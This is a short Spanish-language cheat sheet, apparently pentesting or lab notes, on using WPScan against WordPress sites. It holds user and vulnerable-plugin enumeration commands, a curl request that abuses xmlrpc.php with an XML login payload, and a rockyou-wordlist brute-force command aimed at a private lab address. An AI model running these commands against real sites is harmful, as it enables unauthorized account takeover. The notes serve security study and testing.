# Herramienta: WPScan (WordPress)
**Descripción:** Escaneo de vulnerabilidades en sitios WordPress.

### Comandos Básicos
- `wpscan --url https://example.com`
- `wpscan --url https://example.com --enumerate u`: Descubrir usuarios.
- `wpscan --url https://example.com --enumerate vp`: Descubrir plugins vulnerables.

### Abuso de xmlrpc.php
Este archivo permite realizar solicitudes de inicio de sesión ilimitadas sin ser bloqueado, facilitando la fuerza bruta.
- **Prueba manual con Curl:**
```bash
curl -X POST http://192.168.50.1:31337/xmlrpc.php -d@file.xml

```

file.xml:
<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>{{your username}}</value></param> 
<param><value>{{your password}}</value></param> 
</params> 
</methodCall>


### Fuerza Bruta Rápida

- wpscan --url http://192.168.50.1:31337 -U luka -P /usr/share/wordlist/rockyou.txt
    

### Parámetros adicionales útiles

- --password-attack xmlrpc: Especifica que el ataque de contraseñas use el método xmlrpc.